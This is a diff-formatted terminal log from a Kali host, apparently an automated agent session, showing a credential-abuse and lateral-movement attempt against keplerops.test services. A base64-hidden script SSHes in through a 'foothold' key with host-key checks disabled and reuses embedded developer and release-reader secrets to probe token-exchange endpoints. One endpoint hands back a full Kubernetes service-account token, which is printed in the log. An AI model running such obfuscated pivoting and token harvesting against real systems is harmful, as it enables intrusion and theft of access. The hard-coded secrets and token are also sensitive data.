@@ -1,0 +1,94 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08tok.sh <<'B64EOF'
+> dGltZW91dCA5MCBzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwIC1pIH4vLnNzaC9rZXBsZXJvcHMtZm9vdGhvbGQgLXAgMjIyMiByb3dhbkByb3dhbi1kZXYgJwpDQT1+Ly5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0OyBVPXJvd2FuLml0bzpma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8KSD1ma19yZWxlYXNlX3JlYWRlcl9yZnoyZGR4Uk9Ld1Q2cTlzMFlabkZpZURkX04yMWd4cwpDPWh0dHBzOi8vY2xvdWQtYXBpLmtlcGxlcm9wcy50ZXN0OyBEPWh0dHBzOi8vZGVsaXZlcnkua2VwbGVyb3BzLnRlc3Q6ODQ0MwplY2hvICI9PT0gcm9sZS1leGNoYW5nZSBlbXB0eSA9PT0iOyBjdXJsIC1zUyAtLWNhY2VydCAkQ0EgLXUgIiRVIiAtaSAtWCBQT1NUIC1IICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIC1kICJ7fSIgIiRDL2FwaS90b2tlbi1leGNoYW5nZS9yZWxlYXNlLXJlYWRlciIgfCBoZWFkIC0yMDsgZWNobwplY2hvICI9PT0gcm9sZS1leGNoYW5nZSBoYW5kbGUgPT09IjsgY3VybCAtc1MgLS1jYWNlcnQgJENBIC11ICIkVSIgLWkgLVggUE9TVCAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAtZCAie1wiZXhjaGFuZ2VfaGFuZGxlXCI6XCIkSFwifSIgIiRDL2FwaS90b2tlbi1leGNoYW5nZS9yZWxlYXNlLXJlYWRlciIgfCBoZWFkIC0zMDsgZWNobwplY2hvICI9PT0gcm9sZS1leGNoYW5nZSBiZWFyZXIgaGFuZGxlID09PSI7IGN1cmwgLXNTIC0tY2FjZXJ0ICRDQSAtaSAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEgiIC1IICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIC1kICJ7fSIgIiRDL2FwaS90b2tlbi1leGNoYW5nZS9yZWxlYXNlLXJlYWRlciIgfCBoZWFkIC0yMDsgZWNobwplY2hvICI9PT0gd29ya3NwYWNlIHRva2VuIGVtcHR5ID09PSI7IGN1cmwgLXNTIC0tY2FjZXJ0ICRDQSAtdSAiJFUiIC1pIC1YIFBPU1QgLUggIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiIgLWQgInt9IiAiJEMvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIgfCBoZWFkIC0yMDsgZWNobwplY2hvICI9PT0gZGVsaXZlcnkgd2l0aCBoYW5kbGUgPT09IjsgZm9yIFIgaW4gQkxELVJFTC03NDIgRkxLLTYuOS44IE1UTi02LjkuODsgZG8gZWNobyAiLS0tICRSIjsgY3VybCAtc1MgLS1jYWNlcnQgJENBIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEgiIC1pICIkRC9hcGkvcmVsZWFzZXMvJFIiIHwgaGVhZCAtMTg7IGVjaG87IGRvbmUKJyAyPiYxIHwgaGVhZCAtMjAwCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08tok.sh; bash /tmp/k08tok.sh; echo DONEMARK_1795208410966$((6*7))
+=== role-exchange empty ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:00:24 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 7d0d1690-2435-4b5d-9f97-95f053276a9a
+
+{"error":"workload_token_required"}
+
+=== role-exchange handle ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:00:24 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 91045b55-bfa0-4c45-a769-2592c5c9d7db
+
+{"error":"workload_token_required"}
+
+=== role-exchange bearer handle ===
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:00:24 GMT
+Content-Type: application/json
+Content-Length: 35
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 6879ff42-42e5-41dc-81d2-d59b5cd948bc
+
+{"error":"workload_token_invalid"}
+
+=== workspace token empty ===
+HTTP/1.1 201 Created
+Server: nginx
+Date: Fri, 20 Nov 2026 21:00:24 GMT
+Content-Type: application/json
+Content-Length: 1123
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 11d9137e-66e2-423d-845c-74af3089fc11
+
+{"access_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk1MjEyMDI0LCJpYXQiOjE3OTUyMDg0MjQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNDk3N2JkMGMtYmEwZi00OWJkLWE2NzItNjA5OTFhZGFiMmM4Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoic3ZjLWZpZWxkbGluay13b3JrbG9hZCIsInVpZCI6ImZmMmY3N2ZjLTdlNDMtNDk4OS1iZjZkLWFmYzIxYmExZGE4ZiJ9fSwibmJmIjoxNzk1MjA4NDI0LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZmllbGRsaW5rOnN2Yy1maWVsZGxpbmstd29ya2xvYWQifQ.WExsIrzgtpH26MK_FsXbZuHhyieBeWPTc53ofgyQOXvDtUuv6e0Dew7dXBlzk-q3xi8h2STLLt7mw3CPJ8Neg1owjVw7giJSCPvT4D6-CU7geGLsVweBnbc_bTUZ6PbfZbRD2vtHPLNpkrThkuXCCo6d2wqFyGeeOfQIQ4as--xxVIE9ORqA92PIQZmbMgP2spHRthifVsShyryqIq6eCTzwezQNMFGW0u8Rlcs-MXthdF6HdjFgK-d8T_fmk9FZYMYDmrshj0IEYETzkNhNYGNxBqA_5T6KQAOfbJAkFmxXdZkBsjv9gL8RvY9c7fwSqJB2-tRClKQ84-bdKbz4yA","expires_in":3600,"namespace":"fieldlink","principal":"svc-fieldlink-workload","schema":"fieldkest.workspace-token/v1"}
+
+=== delivery with handle ===
+--- BLD-REL-742
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:00:24 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 85ff6abe-5411-4426-bf4c-8b77d3ca69a8
+
+{"error":"authentication_required"}
+
+--- FLK-6.9.8
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:00:24 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 6fe3fcaf-c132-4592-a646-6a61ccd08b55
+
+{"error":"authentication_required"}
+
+--- MTN-6.9.8
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 21:00:24 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 5221ae54-10d3-4502-8057-63173e52339d
+
+{"error":"authentication_required"}
+
